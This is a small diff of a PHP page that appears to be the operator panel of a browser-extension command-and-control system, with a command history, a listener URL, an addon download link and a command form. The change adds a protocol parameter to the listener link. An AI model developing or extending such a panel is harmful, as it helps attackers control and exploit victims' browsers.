@@ -64,7 +64,7 @@ $p_url = strtolower(explode('/', $_SERVER['SERVER_PROTOCOL'])[0]).'://'.$_SERVER
         <div class="col-lg-12" style="left:5%;right:5%;width:90%;top:2%;">
           <div class="block">
             <div class="title"><strong> Global Commands </strong> <a href="ajax/cnc.php?clear">(clear command history)</a></div>
-            <h2><b><strong>Server Link</strong></b></h2> <input type="text" value="<?=$p_url?>/js/listener.php" style="padding-left: 3px;width:100%; background:lightgrey;" disabled  /><br />
+            <h2><b><strong>Server Link</strong></b></h2> <input type="text" value="<?=$p_url?>/js/listener.php?proto=<?=strtolower(explode('/', $_SERVER['SERVER_PROTOCOL'])[0]);?>" style="padding-left: 3px;width:100%; background:lightgrey;" disabled  /><br />
 						<a href="extension.php">Download Universal Browser Addon</a>
 						<hr />
             <form method="post" action="cmd.php">
